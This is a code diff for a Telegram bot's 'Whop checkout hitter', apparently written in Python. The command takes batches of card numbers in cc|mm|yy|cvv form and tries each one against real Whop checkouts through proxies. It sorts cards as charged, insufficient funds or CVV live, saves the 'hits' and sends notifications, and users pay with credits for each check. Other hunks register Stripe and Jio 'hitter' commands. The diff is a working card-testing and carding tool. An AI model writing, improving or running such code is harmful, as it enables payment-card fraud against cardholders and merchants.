-            f"📊 Progress: <code>{i}/{len(cards)}</code>\n"
-            f"🔄 Checking card {i}...",
-            parse_mode=ParseMode.HTML
-        )
-        
-        result = await check_card_whop(url, card_str, proxy, user_id)
-        results.append(result)
-        
-        if result['status'] == 'CHARGED':
-            charged_card = result
+    for i, arg in enumerate(args):
+        if arg.startswith(('http://', 'https://')) and 'whop.com' in arg:
+            checkout_url = arg
+            card_index = i + 1
             break
     
-    # Build response
-    response = f"┏━━━━━━━⍟\n"
-    response += f"┃ 💳 <b>Whop Charge Result</b>\n"
-    response += f"┗━━━━━━━━━━━⊛\n\n"
-    
-    if charged_card:
-        response += f"✅ <b>CHARGED</b> 🎉\n"
-        response += f"💳 <b>Card</b> ➛ <code>{charged_card['card']}</code>\n"
-        response += f"📝 <b>Response</b> ➛ {charged_card['response']}\n"
-        response += f"⏱️ <b>Time</b> ➛ {charged_card['time']}s\n"
-        if charged_card.get('payment_id'):
-            response += f"🆔 <b>Payment ID</b> ➛ <code>{charged_card['payment_id']}</code>\n"
-        if len(results) > 1:
-            response += f"\n📊 <b>Tried</b> ➛ {len(results)}/{len(cards)} cards"
-    
-    elif results:
-        r = results[0]
-        status_emoji = '❌'
-        status_text = r['status']
-        
-        if r['status'] == 'INSUFFICIENT_FUNDS':
-            status_emoji = '💰'
-            status_text = 'INSUFFICIENT FUNDS'
-        elif r['status'] == '3DS_REQUIRED':
-            status_emoji = '🔐'
-            status_text = '3DS REQUIRED'
-        elif r['status'] == 'PROCESSING':
-            status_emoji = '⏳'
-            status_text = 'PROCESSING'
-        elif r['status'] == 'DECLINED':
-            status_emoji = '❌'
-            status_text = 'DECLINED'
-        
-        response += f"{status_emoji} <b>{status_text}</b>\n"
-        response += f"💳 <b>Card</b> ➛ <code>{r['card']}</code>\n"
-        response += f"📝 <b>Response</b> ➛ {r['response']}\n"
-        response += f"⏱️ <b>Time</b> ➛ {r['time']}s\n"
-        if r.get('payment_id'):
-            response += f"🆔 <b>Payment ID</b> ➛ <code>{r['payment_id']}</code>\n"
-        
-        if len(results) > 1:
-            response += f"\n📊 <b>Tried</b> ➛ {len(results)}/{len(cards)} cards"
-    
-    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
+    if not checkout_url:
+        await message.reply_text(
+            "❌ <b>No valid Whop URL found</b>\n\n"
+            "Please provide a Whop checkout URL starting with http:// or https://",
+            parse_mode=ParseMode.HTML
+        )
+        return
 
-# ============ CONSOLE MODE ============
+    print(f"🔗 URL: {checkout_url}")
 
-async def whop_command_console(args=None):
-    """Console mode for testing Whop checkout"""
-    print("="*60)
-    print("💳 WHOP CHECKOUT HITTER - CONSOLE MODE")
-    print("="*60)
+    if 'whop.com' not in checkout_url:
+        await message.reply_text("❌ This doesn't appear to be a Whop.com checkout URL.")
+        return
+
+    plan_id = whop_extract_plan_id(checkout_url)
+    if not plan_id:
+        await message.reply_text(
+            "❌ <b>Invalid Whop URL</b>\n\n"
+            "Could not find plan_id in the URL.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # ============ EXTRACT ALL CARDS ============
+    cards_text = " ".join(args[card_index:]) if card_index < len(args) else ""
     
-    if args and len(args) > 1:
-        url = args[1]
-    else:
-        url = input("📎 Enter Whop checkout URL: ").strip()
-    
-    if not url:
-        print("❌ No URL provided")
+    if not cards_text:
+        await message.reply_text(
+            "❌ <b>No cards provided</b>\n\n"
+            "Please provide at least one card in format: <code>cc|mm|yy|cvv</code>",
+            parse_mode=ParseMode.HTML
+        )
         return
     
-    if args and len(args) > 2:
-        card_str = args[2]
-    else:
-        card_str = input("💳 Enter card (cc|mm|yy|cvv): ").strip()
+    # Extract cards (one per line or space separated)
+    cards = []
+    lines = cards_text.strip().split('\n')
     
-    result = await check_card_whop(url, card_str, None, None)
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+        # Split by spaces if multiple cards on one line
+        for card_str in line.split():
+            card = card_formatter.extract_single_card_from_text(card_str)
+            if card:
+                cards.append(card)
     
-    print(f"\n{'='*60}")
-    print(f"📊 FINAL RESULT: {result['status']}")
-    print(f"📝 Response: {result['response']}")
-    print(f"⏱️ Time: {result['time']}s")
-    print(f"🆔 Session: {result.get('session_id', 'N/A')}")
-    if result.get('payment_id'):
-        print(f"💳 Payment ID: {result['payment_id']}")
-    print(f"{'='*60}")
-
-if __name__ == "__main__":
-    import sys
+    if not cards:
+        await message.reply_text(
+            "❌ <b>No valid cards found</b>\n\n"
+            "Card format: <code>cc|mm|yy|cvv</code>\n"
+            "Example: <code>4242424242424242|12|26|123</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
     
-    if len(sys.argv) > 1:
-        asyncio.run(whop_command_console(sys.argv))
-    else:
-        print("Usage:")
-        print("  python whop_hitter.py <url> <card>")
-        print("  python whop_hitter.py https://whop.com/checkout/plan_xxx?session=chs_xxx 4242424242424242|12|26|123")
+    print(f"💳 Found {len(cards)} cards to check")
 
+    # ============ CHECK CREDITS ============
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
 
+    whop_active_tasks[user_id] = True
+    
+    # ============ PREMIUM EMOJIS ============
+    PREMIUM_EMOJI_IDS = {
+        "charged": "5039670412733055750",
+        "approved": "6266787022111773140", 
+        "declined": "6267039884016358504",
+        "warning": "6267237615720731788",
+        "info": "5042306247047513767",
+        "success": "5041796412954641308",
+        "error": "6282641460093260838",
+        "card": "5472250091332993630",
+        "bank": "5332455502917949981",
+        "money": "5201873447554145566",
+        "lock": "5197288647275071607",
+        "time": "5382194935057372936",
+        "stats": "5028746137645876535",
+        "skull": "5042167377869932162",
+        "target": "5377336227533969892",
+        "diamond": "5427168083074628963",
+        "fire": "5471133374264684999",
+        "globe": "5447410659077661506",
+        "flash": "5397857289216484878",
+        "clock": "5262540380301191210",
+        "id": "5307905813451397794",
+    }
+    
+    def pe(emoji_id, fallback):
+        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
+    
+    try:
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [Whop] Using proxy: {mask_proxy(proxy_str)}")
 
+        total_cards = len(cards)
+        charged_card = None
+        charged_card_data = None
+        all_results = []
+        start_time = time.time()
+        
+        # ============ PROGRESS MESSAGE ============
+        progress_msg = await message.reply_text(
+            f"{pe(PREMIUM_EMOJI_IDS['flash'], '⚡')} <b>Whop Checkout</b>\n\n"
+            f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} Cards: {total_cards}\n"
+            f"{pe(PREMIUM_EMOJI_IDS['time'], '⏳')} Starting...",
+            parse_mode=ParseMode.HTML
+        )
 
+        # ============ PROCESS CARDS ONE BY ONE ============
+        for idx, card in enumerate(cards, 1):
+            # Update progress
+            try:
+                await progress_msg.edit_text(
+                    f"{pe(PREMIUM_EMOJI_IDS['flash'], '⚡')} <b>Whop Checkout</b>\n\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} Card {idx}/{total_cards}\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['time'], '⏳')} Processing...",
+                    parse_mode=ParseMode.HTML
+                )
+            except:
+                pass
 
+            # Process this card
+            result = await whop_hit(checkout_url, card, proxy_str)
+            bin_info = await get_bin_info(card)
+            
+            status = result.get("status", "UNKNOWN")
+            msg_text = result.get("message", "Unknown")
+            amount = result.get("amount", 0)
+            currency = result.get("currency", "USD")
+            
+            # ============ FIX: Convert amount from cents to dollars ============
+            if amount > 0:
+                amount_display = f"${amount/100:.2f}"
+            else:
+                amount_display = "N/A"
+            
+            print(f"📊 [WHOP] Card {idx}: {status} - {msg_text}")
+            print(f"💰 Amount: {amount} cents = {amount_display}")
+            
+            # Check if message contains insufficient funds
+            if "insufficient" in msg_text.lower() and status != "INSUFFICIENT_FUNDS":
+                status = "INSUFFICIENT_FUNDS"
+                result["status"] = "INSUFFICIENT_FUNDS"
+                result["message"] = "Your card has insufficient funds"
 
+            # ============ FORMAT CARD FOR DISPLAY ============
+            card_parts = card.split('|')
+            card_num = card_parts[0] if len(card_parts) > 0 else card
+            exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+            exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+            exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+            cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+            display_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
 
+            # ============ DETERMINE STATUS WITH PREMIUM EMOJIS ============
+            if status == "CHARGED":
+                status_emoji = pe(PREMIUM_EMOJI_IDS["charged"], "🔥")
+                status_text_display = "Paid ✅"
+                status_category = "charged"
+            elif status == "INSUFFICIENT_FUNDS":
+                status_emoji = pe(PREMIUM_EMOJI_IDS["money"], "💰")
+                status_text_display = "Insufficient Funds"
+                status_category = "approved"
+            elif status == "3DS_REQUIRED":
+                status_emoji = pe(PREMIUM_EMOJI_IDS["lock"], "🔐")
+                status_text_display = "3DS Required"
+                status_category = "approved"
+            elif status == "CVV_LIVE":
+                status_emoji = pe(PREMIUM_EMOJI_IDS["approved"], "✅")
+                status_text_display = "CVV Live"
+                status_category = "approved"
+            elif status == "DECLINED":
+                status_emoji = pe(PREMIUM_EMOJI_IDS["declined"], "❌")
+                status_text_display = "Not Paid ❌"
+                status_category = "declined"
+            else:
+                status_emoji = pe(PREMIUM_EMOJI_IDS["warning"], "⚠️")
+                status_text_display = status
+                status_category = "error"
+
+            # ============ FORMAT CLEAN MESSAGE ============
+            clean_msg = msg_text
+            if len(clean_msg) > 80:
+                clean_msg = clean_msg[:77] + "..."
+
+            # ============ SEND RESULT WITH PREMIUM EMOJIS ============
+            output = (
+                f"┏━━━━━━━⍟\n"
+                f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} Whop Checkout Result\n"
+                f"┗━━━━━━━━━━━⊛\n\n"
+                f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} Site ➳ Whop\n"
+                f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} Amount ➳ {amount_display}\n"
+                f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} Status ➳ {status_emoji} {status_text_display}\n"
+                f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} Progress ➳ {idx}/{total_cards}\n\n"
+                f"{display_card}\n"
+                f"  ⤷ {clean_msg}\n"
+                f"\n"
+                f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} {datetime.now().strftime('%I:%M %p')}\n"
+                f"{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
+            )
+            
+            await message.reply_text(output, parse_mode=ParseMode.HTML)
+
+            # Store result for summary
+            all_results.append({
+                'card': display_card,
+                'status': status,
+                'message': msg_text,
+                'amount': amount_display,
+                'category': status_category
+            })
+
+            # ============ SAVE HIT IF CHARGED OR INSUFFICIENT ============
+            if status in ["CHARGED", "INSUFFICIENT_FUNDS"]:
+                tier = user_manager.get_tier(user_id)
+                
+                await save_hit_to_file(
+                    card=card,
+                    gateway="Whop Checkout",
+                    response=result.get("message", status),
+                    price=amount_display,
+                    bin_info=bin_info,
+                    user_id=user_id,
+                    user_tier=tier
+                )
+
+                user_data = user_manager.get_user(user_id)
+                
+                await send_whop_hit_notification(
+                    context=context,
+                    card=card,
+                    status=status,
+                    message=result.get("message", ""),
+                    amount=amount,
+                    currency=currency,
+                    user_data=user_data,
+                    bin_info=bin_info,
+                    status_category=status_category
+                )
+                
+                if status == "CHARGED":
+                    user_manager.increment_hits(user_id)
+                    charged_card = card
+                    charged_card_data = {
+                        'card': display_card,
+                        'amount': amount_display,
+                        'response': clean_msg
+                    }
+                    # Stop after finding a charged card
+                    break
+                elif status == "INSUFFICIENT_FUNDS":
+                    user_manager.increment_hits(user_id)
+
+            user_manager.increment_checks(user_id)
+
+        # ============ FINAL SUMMARY ============
+        total_time = time.time() - start_time
+        minutes = int(total_time // 60)
+        seconds = int(total_time % 60)
+        
+        charged_count = sum(1 for r in all_results if r['category'] == 'charged')
+        approved_count = sum(1 for r in all_results if r['category'] in ['approved', 'charged'])
+        declined_count = sum(1 for r in all_results if r['category'] == 'declined')
+        
+        # ============ BUILD FINAL SUMMARY WITH PREMIUM EMOJIS ============
+        if charged_card_data:
+            summary = (
+                f"┏━━━━━━━⍟\n"
+                f"┃ {pe(PREMIUM_EMOJI_IDS['success'], '✅')} Whop Checkout Complete\n"
+                f"┗━━━━━━━━━━━⊛\n\n"
+                f"{pe(PREMIUM_EMOJI_IDS['fire'], '🔥')} <b>Charged Card Found!</b>\n"
+                f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} Card ➳ {charged_card_data['card']}\n"
+                f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} Amount ➳ {charged_card_data['amount']}\n"
+                f"{pe(PREMIUM_EMOJI_IDS['info'], 'ℹ️')} Response ➳ {charged_card_data['response']}\n\n"
+                f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} Time ➳ {minutes}m {seconds}s\n"
+                f"{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
+            )
+        else:
+            summary = (
+                f"┏━━━━━━━⍟\n"
+                f"┃ {pe(PREMIUM_EMOJI_IDS['declined'], '❌')} Whop Checkout Complete\n"
+                f"┗━━━━━━━━━━━⊛\n\n"
+                f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Results:</b>\n"
+                f"   ✅ Charged: {charged_count}\n"
+                f"   ✅ Approved: {approved_count - charged_count}\n"
+                f"   ❌ Declined: {declined_count}\n"
+                f"   📝 Total: {len(cards)}\n\n"
+                f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} Time ➳ {minutes}m {seconds}s\n"
+                f"{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
+            )
+        
+        await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
+
+    except Exception as e:
+        print(f"❌ [WHOP] Error: {e}")
+        import traceback
+        traceback.print_exc()
+        try:
+            await progress_msg.edit_text(
+                f"{pe(PREMIUM_EMOJI_IDS['error'], '❌')} <b>Error:</b> {str(e)[:100]}",
+                parse_mode=ParseMode.HTML
+            )
+        except:
+            pass
+    finally:
+        whop_active_tasks.pop(user_id, None)
+        print("="*80)
+        print("🏁 [WHOP COMMAND] Complete")
+        print("="*80)
 
 
 # ============ SC SITES STORAGE ============
@@ -60125,6 +60272,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == 'show_hitter':
         text = (
             f' /stco - Strip Hitter\n\n'
+            f' /jhit - Jio Hitter \n\n'
             f' /whoop - Whoop Hitter\n'
         )
         
@@ -60292,7 +60440,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
     
-
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await verify_group_access(update, context):
         return
@@ -67703,11 +67850,12 @@ def main():
     # ============ WHOP COMMANDS ============
     app.add_handler(CommandHandler("whop", whop_command))
     
+    
     # ============ STRIPE CO COMMANDS ============
     app.add_handler(CommandHandler("stco", stco_command))
     
     # ============ JIO COMMANDS ============
-    app.add_handler(CommandHandler("jhit", jhit_command))
+    
     
     
     # ============ PAYMENT SYSTEM COMMANDS ============
@@ -67730,6 +67878,7 @@ def main():
     
     # ============ CO COMMAND ============
     app.add_handler(CommandHandler("co", co_command))
+    app.add_handler(CommandHandler("jhit", jhit_command))
     
     # ============ SITE NORMAL REMOVAL COMMANDS ============
     app.add_handler(CommandHandler("rnormal", remove_normal_sites_direct))
